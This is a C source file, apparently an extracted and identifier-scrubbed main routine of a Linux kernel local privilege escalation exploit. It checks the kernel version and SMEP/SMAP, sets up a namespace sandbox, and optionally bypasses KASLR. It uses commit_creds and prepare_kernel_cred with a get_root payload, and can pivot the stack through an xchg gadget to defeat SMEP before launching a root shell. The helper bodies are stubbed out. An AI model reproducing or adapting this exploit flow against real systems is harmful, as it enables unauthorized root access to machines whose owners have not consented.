#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  COMMIT_CREDS ; 
 int /*<<< orphan*/  KERNEL_BASE ; 
 int /*<<< orphan*/  PREPARE_KERNEL_CRED ; 
 char* SHELL ; 
 unsigned long XCHG_EAX_ESP_RET ; 
 int /*<<< orphan*/  FUNC0 () ; 
 int /*<<< orphan*/  FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (char*,...) ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int /*<<< orphan*/  get_root ; 
 int /*<<< orphan*/  FUNC5 () ; 
 int /*<<< orphan*/  FUNC6 (unsigned long) ; 
 int /*<<< orphan*/  FUNC7 () ; 

int FUNC8(int argc, char** argv) {
	if (argc > 1) SHELL = argv[1];

	FUNC3("[.] starting\n");

	FUNC3("[.] checking kernel version\n");
	FUNC2();
	FUNC3("[~] done, version looks good\n");

	FUNC3("[.] checking SMEP and SMAP\n");
	FUNC1();
	FUNC3("[~] done, looks good\n");

	FUNC3("[.] setting up namespace sandbox\n");
	FUNC7();
	FUNC3("[~] done, namespace sandbox set up\n");

#if ENABLE_KASLR_BYPASS
	dprintf("[.] KASLR bypass enabled, getting kernel addr\n");
	KERNEL_BASE = get_kernel_addr();
	dprintf("[~] done, kernel addr:   %lx\n", KERNEL_BASE);
#endif

	FUNC3("[.] commit_creds:        %lx\n", COMMIT_CREDS);
	FUNC3("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

	unsigned long payload = (unsigned long)&get_root;

#if ENABLE_SMEP_BYPASS
	dprintf("[.] SMEP bypass enabled, mmapping fake stack\n");
	mmap_stack();
	payload = XCHG_EAX_ESP_RET;
	dprintf("[~] done, fake stack mmapped\n");
#endif

	FUNC3("[.] executing payload %lx\n", payload);
	FUNC6(payload);
	FUNC3("[~] done, should be root now\n");

	FUNC0();

	return 0;
}